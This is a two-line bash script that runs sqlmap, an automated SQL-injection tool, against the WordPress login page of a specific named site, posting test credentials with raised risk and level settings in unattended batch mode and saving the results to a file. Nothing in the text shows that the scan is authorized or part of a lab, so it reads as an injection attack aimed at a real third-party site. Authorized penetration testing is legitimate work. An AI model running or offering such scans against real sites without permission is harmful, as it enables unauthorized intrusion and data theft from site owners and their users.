#!/bin/bash
sqlmap -u "https://pascualbravo.ingejei.com/wp-login.php" --data="log=prueba&pwd=1234" --risk=2 --level=2 --batch > sqlresultado.txt
